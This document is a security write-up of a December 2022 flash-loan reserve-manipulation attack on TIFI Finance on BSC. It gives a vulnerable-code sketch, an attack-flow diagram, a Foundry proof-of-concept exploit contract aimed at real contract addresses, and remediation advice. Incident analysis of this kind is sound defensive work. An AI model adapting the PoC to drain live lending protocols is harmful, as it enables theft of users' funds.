# TIFI Finance — Flash Loan Reserve Manipulation via deposit()/borrow() Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | TIFI Finance |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **TIFI Finance** | [0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B](https://bscscan.com/address/0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B) |
| **TIFI Token** | [0x17E65E6b9B166Fb8e7c59432F0db126711246BC0](https://bscscan.com/address/0x17E65E6b9B166Fb8e7c59432F0db126711246BC0) |
| **TIFI Router** | [0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4](https://bscscan.com/address/0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **WBNB/BUSD LP (Flash Loan)** | [0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16](https://bscscan.com/address/0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **BUSD** | [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56](https://bscscan.com/address/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) |
| **Root Cause** | Calling `borrow()` after `deposit()` while internal reserves are manipulated via a WBNB→BUSD swap allows borrowing the entire TIFI token supply based on the manipulated reserve ratio |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/TIFI_exp.sol) |

---
## 1. Vulnerability Overview

TIFI Finance was a lending protocol that allowed users to deposit BUSD and borrow TIFI tokens. The `borrow()` function calculated the borrowable TIFI amount based on the current TIFI/BUSD internal reserve ratio. The attacker flash-borrowed 5 WBNB and 500 BUSD from the PancakeSwap WBNB/BUSD LP, then first deposited BUSD via `deposit()`. They then executed a WBNB→BUSD swap to artificially inflate the BUSD reserve within the TIFI protocol. With the reserves in this manipulated state, calling `borrow()` allowed the attacker to borrow the entire TIFI token supply. The borrowed TIFI was swapped for WBNB to repay the flash loan.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable TIFI Finance - borrow() calculates based on manipulated reserves
contract TIFIFinance {
    uint256 public tifiReserve;   // TIFI token holdings
    uint256 public busdReserve;   // BUSD holdings

    // deposit(): Deposit BUSD and update internal balance
    function deposit(uint256 busdAmount) external {
        BUSD.transferFrom(msg.sender, address(this), busdAmount);
        busdReserve += busdAmount;
        depositBalance[msg.sender] += busdAmount;
    }

    // ❌ borrow(): Calculate TIFI borrow amount from current reserve ratio
    function borrow(uint256 busdAmount) external {
        require(depositBalance[msg.sender] >= busdAmount, "Insufficient deposit");

        // ❌ Calculate borrowable TIFI using busdReserve/tifiReserve ratio
        // Inflating busdReserve via WBNB→BUSD swap causes borrowed TIFI to spike
        uint256 tifiOut = busdAmount * tifiReserve / busdReserve;

        // ❌ Entire TIFI supply can be borrowed at the manipulated ratio
        tifiReserve -= tifiOut;
        TIFI.transfer(msg.sender, tifiOut);
    }
}

// ✅ Correct pattern - use a fixed exchange rate or oracle that cannot be externally manipulated
contract SafeTIFIFinance {
    AggregatorV3Interface public tifiOracle;
    AggregatorV3Interface public busdOracle;

    function borrow(uint256 busdAmount) external {
        require(depositBalance[msg.sender] >= busdAmount, "Insufficient deposit");

        // ✅ Chainlink oracle-based exchange rate (manipulation-resistant)
        (, int256 tifiPrice,,,) = tifiOracle.latestRoundData();
        (, int256 busdPrice,,,) = busdOracle.latestRoundData();
        uint256 tifiOut = busdAmount * uint256(busdPrice) / uint256(tifiPrice);

        // ✅ Apply maximum LTV ratio
        tifiOut = tifiOut * LTV_RATIO / 100;
        tifiReserve -= tifiOut;
        TIFI.transfer(msg.sender, tifiOut);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**TIFI_decompiled.sol** — Entry points:
```solidity
// ❌ Root cause: Calling `borrow()` after `deposit()` while internal reserves are manipulated via a WBNB→BUSD swap allows borrowing the entire TIFI token supply based on the manipulated reserve ratio
    function deposit(address arg0, uint256 arg1) external {}  // 0x47e7ef24  // ❌ Vulnerability

    function borrow(address arg0, uint256 arg1) external {}  // 0x4b8a3529  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan from PancakeSwap WBNB/BUSD LP
    │       Borrow 5 WBNB + 500 BUSD (pancakeCall callback)
    │
    ├─[2] deposit() 500 BUSD into TIFI Finance
    │       depositBalance[attacker] += 500 BUSD
    │       busdReserve += 500 BUSD
    │
    ├─[3] WBNB → BUSD swap (PancakeSwap or TIFI Router)
    │       Further increases BUSD reserve inside TIFI Finance
    │       busdReserve spikes dramatically
    │       ❌ tifiReserve unchanged → TIFI/BUSD ratio plummets
    │
    ├─[4] Call borrow() (equivalent to 500 BUSD)
    │       ❌ TIFI borrow amount calculated from manipulated busdReserve
    │       tifiOut = 500 * tifiReserve / (manipulated busdReserve)
    │       → Borrows entire or majority of TIFI token supply
    │
    ├─[5] TIFI → WBNB swap (PancakeSwap)
    │       Convert borrowed TIFI to WBNB
    │
    ├─[6] Repay PancakeSwap LP flash loan
    │       Repay 5 WBNB + fee
    │
    └─[7] Net profit: WBNB arbitrage gain
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ITIFIFinance {
    function deposit(uint256 amount) external;
    function borrow(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract TIFIExploit is Test {
    ITIFIFinance tifiFinance = ITIFIFinance(0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B);
    IERC20       TIFI        = IERC20(0x17E65E6b9B166Fb8e7c59432F0db126711246BC0);
    IRouter      router      = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IRouter      tifiRouter  = IRouter(0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4);
    IPancakePair flashPair   = IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    IERC20       WBNB        = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20       BUSD        = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB", WBNB.balanceOf(address(this)), 18);

        // [Step 1] Flash loan 5 WBNB + 500 BUSD from WBNB/BUSD LP
        flashPair.swap(5 * 1e18, 500 * 1e18, address(this), abi.encode(true));

        emit log_named_decimal_uint("[End] WBNB", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 wbnbAmount, uint256 busdAmount, bytes calldata) external {
        // [Step 2] BUSD → TIFI Finance deposit
        BUSD.approve(address(tifiFinance), type(uint256).max);
        tifiFinance.deposit(busdAmount);

        // [Step 3] WBNB → BUSD swap to manipulate TIFI Finance reserves
        // ⚡ busdReserve spikes → TIFI/BUSD ratio becomes distorted
        WBNB.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB); path[1] = address(BUSD);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnbAmount, 0, path, address(tifiFinance), block.timestamp
        );

        // [Step 4] borrow() - borrow entire TIFI supply against manipulated reserves
        // ⚡ Key: increased busdReserve allows borrowing far more TIFI for the same BUSD
        tifiFinance.borrow(busdAmount);

        // [Step 5] TIFI → WBNB swap
        TIFI.approve(address(router), type(uint256).max);
        path[0] = address(TIFI); path[1] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            TIFI.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // [Step 6] Repay flash loan (principal + fee)
        uint256 repayWBNB = wbnbAmount * 10000 / 9975 + 1;
        uint256 repayBUSD = busdAmount * 10000 / 9975 + 1;
        WBNB.transfer(address(flashPair), repayWBNB);
        BUSD.transfer(address(flashPair), repayBUSD);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reserve manipulation via external swap after `deposit()` → full TIFI borrow via `borrow()` |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation + lending protocol vulnerability |
| **Attack Vector** | PancakeSwap flash loan (5 WBNB + 500 BUSD) → `deposit()` → WBNB→BUSD swap (reserve manipulation) → `borrow()` → TIFI→WBNB |
| **Preconditions** | `borrow()` borrow amount calculation depends on an internally stored reserve ratio that can be externally manipulated |
| **Impact** | Entire TIFI token supply borrowed (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **External oracle-based pricing**: Use an external price feed such as Chainlink for the collateral/borrow ratio calculation in `borrow()` to eliminate the influence of internal reserve manipulation.
2. **Reserve snapshots**: Add snapshot-based validation between `deposit()` and `borrow()` that checks whether internal reserves changed, and reverts the transaction if they have.
3. **Stricter LTV limits**: Apply a conservative Loan-to-Value (LTV) ratio to the maximum borrowable amount within a single transaction to constrain over-borrowing caused by reserve manipulation.
4. **Block same-transaction deposit-borrow**: Prevent or delay an immediate `borrow()` call following `deposit()` within the same transaction, or require a minimum block delay.

---
## 7. Lessons Learned

- **Risks of internal reserve-based lending**: When a lending protocol calculates borrow limits from its own internal reserve ratios, those reserves can be manipulated via external swaps to enable over-borrowing. Price references in lending protocols must always rely on externally verified oracles.
- **deposit + external swap + borrow pattern**: The pattern of flash-borrowing → deposit → manipulating reserves via an external swap → borrow is a recurring attack vector in lending protocols. Defensive logic must be added between each step to prevent this three-stage combination from being executed within a single transaction.
- **Sufficiency of small-scale flash loans**: The attack succeeded with a modest flash loan of just 5 WBNB + 500 BUSD. Reserve-ratio-based lending protocols are vulnerable regardless of liquidity scale; oracle-based pricing must be used independently of pool size.